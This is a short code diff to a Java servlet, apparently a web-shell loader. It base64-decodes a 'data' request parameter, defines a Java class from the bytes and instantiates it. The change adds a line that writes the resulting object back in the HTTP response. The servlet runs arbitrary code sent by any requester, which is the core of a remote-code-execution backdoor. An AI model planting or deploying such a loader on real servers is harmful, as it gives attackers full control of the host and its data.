@@ -22,7 +22,8 @@ public class Base64ClassLoaderServlet extends ClassLoader implements Servlet {
         String data = req.getParameter("data");
         try {
             byte[] bytes = decodeBase64(data);
-            defineClass(null, bytes, 0, bytes.length).newInstance();
+            Object obj = defineClass(null, bytes, 0, bytes.length).newInstance();
+            res.getWriter().print(obj);
         } catch (Exception e) {
             throw new RuntimeException(e);
         }
